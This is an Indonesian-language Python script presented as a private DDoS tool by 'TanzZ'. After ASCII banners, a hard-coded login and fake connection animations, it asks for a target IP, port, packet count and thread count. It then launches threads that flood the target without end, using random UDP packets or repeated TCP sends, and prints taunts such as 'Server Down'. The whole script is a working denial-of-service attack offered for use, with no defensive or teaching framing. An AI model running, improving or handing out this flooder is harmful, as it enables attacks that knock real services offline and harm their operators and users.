#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by SlayerEx
#Join My T3Am : https://discord.gg/pornhub
import random
import socket
import threading
import time
import os

os.system("clear")
print("""\033[93m
\033[93m
 █████                          ███
░░███                          ░░░
 ░███         ██████   ███████ ████  ████████
 ░███        ███░░███ ███░░███░░███ ░░███░░███
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███
 ███████████░░██████ ░░███████ █████ ████ █████
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░
                      ███ ░███
                     ░░██████
                      ░░░░░░
             \033[93m>> \033[96mPrivate Tools By TanzZ \033[93m<<
            \033[97m
   ███
  █   █
\033[97m  █   █                      \033[93m TolsBuriqqq
\033[97m█████████               ██   \033[93m Sangat Amat Tols Buriq Di Jual? Yatim Eh Canda
\033[97m█████████              █  █  \033[93m Tols Ini Tidak Boleh Di JuaL/Di Sebar Ya Mek
\033[97m███   ███ ██████████████  █
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m

""")
username = str(input("\033[33m[TolsOpTanzZ] \033[93mUsername:"))
password = str(input("\033[33m[TolsOpTanzZ] \033[93mPassword:"))
if password == "2009" and username == "Juni":
    print ("Logged in as admin")
    time.sleep(2)

else:
    print ("Incorrect Password. Please try again.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("""
  ____           _         _            ____
 / ___| __ _  __| | __ _  | |   _   _  | __ )  __ _ _   _  
| |  _ / _` |/ _` |/ _` | | |  | | | | |  _ \ / _` | | | | [+] Author  : TanzzCok
| |_| | (_| | (_| | (_| | | |__| |_| | | |_) | (_| | |_| | [+} Bismillah DuluBiarHalal
 \____|\__,_|\__,_|\__,_| |_____\__,_| |____/ \__,_|\__,_| [+] Team    : TanzZ
""")
print("""
___________________________________________

>>>>>Kalau Mau Pakek Ganteng Dulu<<<<<")
>>>>>Please Not Abuse Tols<<<<<
___________________________________________
""")
ip = str(input("[+] TanzZGanteng | Ip:"))
port = int(input("[+] TanzZGanteng | Port:"))
choice = str(input("[+] TanzZGanteng | Gas Gak Ni?(y/n):"))
times = int(input("[+] TanzZGanteng | Packets:"))
threads = int(input("[+] TanzZGanteng | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | TanzzAnakBaik |")
		except:
			print("[!] | Server Down!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Ezz Banget Sih Dek Dek + !!!")
		except:
			s.close()
			print("[*] Down Lagi Nih")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
